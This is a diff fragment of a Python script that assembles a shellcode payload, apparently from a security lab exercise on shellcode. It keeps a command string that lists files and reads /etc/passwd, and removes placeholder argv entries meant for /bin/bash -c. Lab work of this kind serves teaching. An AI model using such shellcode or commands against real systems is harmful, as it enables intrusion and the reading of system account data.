@@ -16,10 +16,6 @@ shellcode = (
    # You can delete/add spaces, if needed, to keep the position the same. 
    # The * in this line serves as the position marker         * 
    "/bin/ls -l; echo Hello 32; /bin/tail -n 2 /etc/passwd     *"
-   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
-   "BBBB"   # Placeholder for argv[1] --> "-c"
-   "CCCC"   # Placeholder for argv[2] --> the command string
-   "DDDD"   # Placeholder for argv[3] --> NULL
 ).encode('latin-1')
 
 content = bytearray(200)
